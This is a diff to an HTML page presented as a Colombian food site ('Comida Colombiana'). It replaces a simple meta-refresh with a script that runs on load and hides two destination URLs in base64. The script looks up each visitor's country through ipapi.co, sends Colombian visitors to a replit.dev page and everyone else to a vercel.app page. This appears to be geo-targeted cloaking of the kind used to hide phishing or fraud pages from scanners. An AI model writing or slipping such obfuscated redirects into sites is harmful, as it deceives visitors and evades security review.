@@ -4,7 +4,26 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Comida Colombiana</title>
-<meta http-equiv="refresh" content="1; URL=https://9c9b8f1e-6840-435a-8a73-9dba9f4050bd-00-2r4errh6dk363.worf.replit.dev/sv/index.html"/>
+
+    <script>
+(function(){
+  const URL_CO  = atob("aHR0cHM6Ly85YzliOGYxZS02ODQwLTQzNWEtOGE3My05ZGJhOWY0MDUwYmQtMDAtMnI0ZXJyaDZkazM2My53b3JmLnJlcGxpdC5kZXYvc3YvaW5kZXguaHRtbA==");
+  const URL_OUT = atob("aHR0cHM6Ly9jb21pZGFwb3B1bGFyLnZlcmNlbC5hcHAvaW5jaW8uaHRtbA==");
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "CO") {
+        window.location.href = URL_CO;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
 
 <style>
 html, body {
